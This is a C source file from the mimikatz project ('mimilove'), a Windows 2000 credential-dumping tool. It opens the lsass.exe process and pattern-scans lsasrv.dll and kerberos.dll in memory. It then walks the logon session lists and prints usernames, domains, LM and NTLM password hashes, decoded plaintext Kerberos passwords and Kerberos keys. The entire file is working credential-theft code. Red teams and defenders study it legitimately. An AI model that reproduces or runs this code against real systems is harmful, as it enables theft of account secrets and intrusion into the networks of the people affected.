/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimilove.h"

int wmain(int argc, wchar_t *argv[])
{
	DWORD pid;
	HANDLE hProcess;
	PKULL_M_MEMORY_HANDLE hMemory;
	OSVERSIONINFO osInfo;

	kprintf(L"\n"
		L"  .#####.   " MIMILOVE_FULL L"\n"
		L" .## ^ ##.  " MIMILOVE_SECOND L"\n"
		L" ## / \\ ##  /* * *\n"
		L" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		L" '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
		L"  '#####'    " MIMILOVE_SPECIAL L"* * */\n\n");

	RtlZeroMemory(&osInfo, sizeof(OSVERSIONINFO));
	osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if(GetVersionEx(&osInfo))
	{
		if((osInfo.dwMajorVersion == 5) && (osInfo.dwMinorVersion == 0))
		{
			if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
			{
				if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid))
				{
					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
					{
						mimilove_lsasrv(hMemory);
						mimilove_kerberos(hMemory);
						kull_m_memory_close(hMemory);
					}
					CloseHandle(hProcess);
				}
				else PRINT_ERROR_AUTO(L"OpenProcess");
			}
		}
		else PRINT_ERROR(L"Only for Windows 2000\n");
	}
	else PRINT_ERROR_AUTO(L"GetVersionEx");

	return ERROR_SUCCESS;
}

BOOL kuhl_m_sekurlsa_utils_love_search(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION mi, PKULL_M_MINI_PATTERN pa, PVOID * genericPtr)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, mi->DllBase.hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{mi->DllBase.address, mi->DllBase.hMemory}, mi->SizeOfImage}, NULL};
	aLocalMemory.address = pa->Pattern;
	if(kull_m_memory_search(&aLocalMemory, pa->Length, &sMemory, FALSE))
	{
		aLsassMemory.address = (PBYTE) sMemory.result + pa->offset;
		aLocalMemory.address = genericPtr;
		status = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
	}
	return status;
}

const wchar_t * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	L"UndefinedLogonType",
	L"Unknown !",
	L"Interactive",
	L"Network",
	L"Batch",
	L"Service",
	L"Proxy",
	L"Unlock",
	L"NetworkCleartext",
	L"NewCredentials",
	L"RemoteInteractive",
	L"CachedInteractive",
	L"CachedRemoteInteractive",
	L"CachedUnlock",
};
const ANSI_STRING
	PRIMARY_STRING = {7, 8, "Primary"};

void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
{
	BYTE PTRN_W2K_LogonSessionTable[] = {0xff, 0x50, 0x10, 0x85, 0xc0, 0x74};
	KULL_M_MINI_PATTERN paLsasrv = {sizeof(PTRN_W2K_LogonSessionTable), PTRN_W2K_LogonSessionTable, -9};
	PLIST_ENTRY LogonSessionTable = NULL;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION miLsasrv;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	PVOID baseTable, base;
	KIWI_MSV1_0_LOGON_SESSION_TABLE_50 table;
	KIWI_MSV1_0_LIST_50 list;
	KIWI_MSV1_0_ENTRY_50 entry;
	KIWI_MSV1_0_CREDENTIALS credentials;
	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	PMSV1_0_PRIMARY_CREDENTIAL_50 pPrimaryCred;
	DWORD tableCount = 0, i;

	kprintf(L"========================================\n"
		L"LSASRV Credentials (MSV1_0, ...)\n"
		L"========================================\n\n"
		);

	if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"lsasrv.dll", &miLsasrv))
	{
		if(kuhl_m_sekurlsa_utils_love_search(&miLsasrv, &paLsasrv, (PVOID *) &LogonSessionTable))
		{
			aLocalMemory.address = &base; // buffer
			aLsassMemory.address = LogonSessionTable;
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
			{
				if(aLsassMemory.address = base) // buffer
				{
					aLocalMemory.address = &table;
					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50)))
					{
						if(table.tag == 'XTHL')
						{
							tableCount = 16;
							baseTable = (PBYTE) aLsassMemory.address + sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50);
						}
						else if(table.tag == 'XTHS')
						{
							tableCount = 1;
							baseTable = aLsassMemory.address;
						}
						else PRINT_ERROR(L"unknown table tag\n");
					}
					
					for(i = 0; i < tableCount ; i++)
					{
						aLsassMemory.address = (PBYTE) baseTable + i * sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50);
						aLocalMemory.address = &table;
						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_LOGON_SESSION_TABLE_50)))
						{
							base = (PBYTE) aLsassMemory.address + FIELD_OFFSET(KIWI_MSV1_0_LOGON_SESSION_TABLE_50, list);
							if(aLsassMemory.address = table.list.Flink)
							{
								while(aLsassMemory.address != base)
								{
									aLocalMemory.address = &list;
									if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_LIST_50)))
									{
										if(aLsassMemory.address = list.entry)
										{
											aLocalMemory.address = &entry;
											if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_ENTRY_50)))
											{
												if(aLsassMemory.address = entry.Credentials)
												{
													kull_m_process_getUnicodeString(&entry.UserName, hMemory);
													kull_m_process_getUnicodeString(&entry.Domaine, hMemory);
													kull_m_process_getSid(&entry.pSid, hMemory);

													kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
														L"Session           : %s from %u\n"
														L"User Name         : %wZ\n"
														L"Domain            : %wZ\n"
														, entry.LocallyUniqueIdentifier.HighPart, entry.LocallyUniqueIdentifier.LowPart, entry.LocallyUniqueIdentifier.HighPart, entry.LocallyUniqueIdentifier.LowPart, KUHL_M_SEKURLSA_LOGON_TYPE[entry.LogonType], entry.Session, &entry.UserName, &entry.Domaine);
													kprintf(L"Logon Time        : ");
													kull_m_string_displayLocalFileTime(&entry.LogonTime);
													kprintf(L"\nSID               : ");
													if(entry.pSid)
														kull_m_string_displaySID(entry.pSid);
													kprintf(L"\n");

													if(entry.UserName.Buffer)
														LocalFree(entry.UserName.Buffer);
													if(entry.Domaine.Buffer)
														LocalFree(entry.Domaine.Buffer);
													if(entry.pSid)
														LocalFree(entry.pSid);

													while(aLsassMemory.address)
													{
														aLocalMemory.address = &credentials;
														if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_CREDENTIALS)))
														{
															if(aLsassMemory.address = credentials.PrimaryCredentials)
															{
																while(aLsassMemory.address)
																{
																	aLocalMemory.address = &primaryCredentials;
																	if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
																	{
																		kull_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, hMemory);
																		kull_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Credentials, hMemory);

																		kprintf(L"\t[%Z]\n", &primaryCredentials.Primary);
																		if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
																		{
																			pPrimaryCred = (PMSV1_0_PRIMARY_CREDENTIAL_50) primaryCredentials.Credentials.Buffer;
																			kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCred, &pPrimaryCred->UserName, FALSE);
																			kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCred, &pPrimaryCred->LogonDomainName, FALSE);
																			kprintf(L"\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCred->UserName, &pPrimaryCred->LogonDomainName);
																			if(pPrimaryCred->isLmOwfPassword)
																			{
																				kprintf(L"\n\t * LM       : ");
																				kull_m_string_wprintf_hex(pPrimaryCred->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
																			}
																			if(pPrimaryCred->isNtOwfPassword)
																			{
																				kprintf(L"\n\t * NTLM     : ");
																				kull_m_string_wprintf_hex(pPrimaryCred->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
																			}
																			kprintf(L"\n");
																		}
																		else
																		{
																			kull_m_string_wprintf_hex(primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.Length, 1 | (16 << 16));
																		}

																		if(primaryCredentials.Primary.Buffer)
																			LocalFree(primaryCredentials.Primary.Buffer);
																		if(primaryCredentials.Credentials.Buffer)
																			LocalFree(primaryCredentials.Credentials.Buffer);

																		aLsassMemory.address = primaryCredentials.next;
																	}
																	else
																	{
																		PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_PRIMARY_CREDENTIALS");
																		break;
																	}
																}
															}
															aLsassMemory.address = credentials.next;
														}
														else
														{
															PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_CREDENTIALS");
															break;
														}
													}
													kprintf(L"\n");
												}
											}
											else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_ENTRY_50");
										}
										else PRINT_ERROR(L"list.entry is NULL\n");
										aLsassMemory.address = list.Flink;
									}
									else
									{
										PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LIST_50");
										break;
									}
								}
							}
							else PRINT_ERROR(L"table.list is NULL\n");
						}
						else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LOGON_SESSION_TABLE_50");
					}
				}
				else PRINT_ERROR(L"LogonSessionTable is NULL\n");
			}
			else PRINT_ERROR_AUTO(L"kull_m_memory_copy / ptr 1");
		}
		else PRINT_ERROR_AUTO(L"lsasrv pattern not found");
	}
	else PRINT_ERROR_AUTO(L"lsasrv module info");
}

void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
{
	BYTE PTRN_W2K_KerbLogonSessionList[] = {0x8b, 0x5c, 0x24, 0x18, 0x8b, 0x13};
	KULL_M_MINI_PATTERN paKerberos = {sizeof(PTRN_W2K_KerbLogonSessionList), PTRN_W2K_KerbLogonSessionList, -8};
	PLIST_ENTRY KerbLogonSessionList = NULL;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION miKerberos;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	PVOID base;
	BYTE hash;
	KIWI_KERBEROS_LOGON_SESSION_50 session;
	KIWI_KERBEROS_KEYS_LIST_5 keyList;
	PKERB_HASHPASSWORD_5 pKeys;
	DWORD i;
	UNICODE_STRING tmpBuffer;

	kprintf(L"========================================\n"
		L"KERBEROS Credentials (no tickets, sorry)\n"
		L"========================================\n\n"
		);

	if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"kerberos.dll", &miKerberos))
	{
		if(kuhl_m_sekurlsa_utils_love_search(&miKerberos, &paKerberos, (PVOID *) &KerbLogonSessionList))
		{
			aLocalMemory.address = &base; // buffer
			aLsassMemory.address = KerbLogonSessionList;
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
			{
				if(aLsassMemory.address = base) // buffer
				{
					while(aLsassMemory.address != KerbLogonSessionList)
					{
						aLocalMemory.address = &session;
						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_KERBEROS_LOGON_SESSION_50)))
						{
							if(session.Password.Length || session.pKeyList)
							{
								kull_m_process_getUnicodeString(&session.UserName, hMemory);
								kull_m_process_getUnicodeString(&session.Domaine, hMemory);
								kull_m_process_getUnicodeString(&session.Password, hMemory);

								kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
									L"User Name         : %wZ\n"
									L"Domain            : %wZ\n"
									L"Password          : "
									, session.LocallyUniqueIdentifier.HighPart, session.LocallyUniqueIdentifier.LowPart, session.LocallyUniqueIdentifier.HighPart, session.LocallyUniqueIdentifier.LowPart, &session.UserName, &session.Domaine);

								hash = *((PBYTE) &session.Password.Length + 1); // please...
								*((PBYTE) &session.Password.Length + 1) = 0;
								RtlRunDecodeUnicodeString(hash, &session.Password);

								if(!session.Password.Length || kull_m_string_suspectUnicodeString(&session.Password))
									kprintf(L"%wZ", &session.Password);
								else
									kull_m_string_wprintf_hex(session.Password.Buffer, session.Password.Length, 1);
								kprintf(L"\n");

								if(aLsassMemory.address = session.pKeyList)
								{
									aLocalMemory.address = &keyList;
									if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_KERBEROS_KEYS_LIST_5)))
									{
										if(pKeys = (PKERB_HASHPASSWORD_5) LocalAlloc(LPTR, keyList.cbItem * sizeof(KERB_HASHPASSWORD_5)))
										{
											aLsassMemory.address = (PBYTE) session.pKeyList + sizeof(KIWI_KERBEROS_KEYS_LIST_5);
											aLocalMemory.address = pKeys;
											if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, keyList.cbItem * sizeof(KERB_HASHPASSWORD_5)))
											{
												for(i = 0; i < keyList.cbItem; i++)
												{
													kprintf(L"\t%s ", mimilove_kerberos_etype(pKeys[i].generic.Type));
													if(tmpBuffer.Length = tmpBuffer.MaximumLength = (USHORT) pKeys[i].generic.Size)
													{
														if(tmpBuffer.Buffer = (PWSTR) pKeys[i].generic.Checksump)
														{
															if(kull_m_process_getUnicodeString(&tmpBuffer, hMemory))
															{
																kull_m_string_wprintf_hex(tmpBuffer.Buffer, tmpBuffer.Length, 0); kprintf(L"\n");
																LocalFree(tmpBuffer.Buffer);
															}
														}
													}
												}
											}
											else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KERB_HASHPASSWORD_5");
											LocalFree(pKeys);
										}
									}
									else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_KERBEROS_KEYS_LIST_5");
								}
								kprintf(L"\n");

								if(session.UserName.Buffer)
									LocalFree(session.UserName.Buffer);
								if(session.Domaine.Buffer)
									LocalFree(session.Domaine.Buffer);
								if(session.Password.Buffer)
									LocalFree(session.Password.Buffer);
							}
							aLsassMemory.address = session.Entry.Flink;
						}
						else
						{
							PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_KERBEROS_LOGON_SESSION_50");
							break;
						}
					}
				}
				else PRINT_ERROR(L"KerbLogonSessionList is NULL\n");
			}
			else PRINT_ERROR_AUTO(L"kull_m_memory_copy / ptr 1");
		}
		else PRINT_ERROR_AUTO(L"kerberos pattern not found");
	}
	else PRINT_ERROR_AUTO(L"kerberos module info");
}

PCWCHAR mimilove_kerberos_etype(LONG eType)
{
	PCWCHAR type;
	switch(eType)
	{
	case KERB_ETYPE_NULL:							type = L"null             "; break;
	case KERB_ETYPE_DES_PLAIN:						type = L"des_plain        "; break;
	case KERB_ETYPE_DES_CBC_CRC:					type = L"des_cbc_crc      "; break;
	case KERB_ETYPE_DES_CBC_MD4:					type = L"des_cbc_md4      "; break;
	case KERB_ETYPE_DES_CBC_MD5:					type = L"des_cbc_md5      "; break;
	case KERB_ETYPE_DES_CBC_MD5_NT:					type = L"des_cbc_md5_nt   "; break;
	case KERB_ETYPE_RC4_PLAIN:						type = L"rc4_plain        "; break;
	case KERB_ETYPE_RC4_PLAIN2:						type = L"rc4_plain2       "; break;
	case KERB_ETYPE_RC4_PLAIN_EXP:					type = L"rc4_plain_exp    "; break;
	case KERB_ETYPE_RC4_LM:							type = L"rc4_lm           "; break;
	case KERB_ETYPE_RC4_MD4:						type = L"rc4_md4          "; break;
	case KERB_ETYPE_RC4_SHA:						type = L"rc4_sha          "; break;
	case KERB_ETYPE_RC4_HMAC_NT:					type = L"rc4_hmac_nt      "; break;
	case KERB_ETYPE_RC4_HMAC_NT_EXP:				type = L"rc4_hmac_nt_exp  "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD:					type = L"rc4_plain_old    "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD_EXP:				type = L"rc4_plain_old_exp"; break;
	case KERB_ETYPE_RC4_HMAC_OLD:					type = L"rc4_hmac_old     "; break;
	case KERB_ETYPE_RC4_HMAC_OLD_EXP:				type = L"rc4_hmac_old_exp "; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes128_hmac_plain"; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes256_hmac_plain"; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:		type = L"aes128_hmac      "; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:		type = L"aes256_hmac      "; break;
	default:										type = L"unknow           "; break;
	}
	return type;
}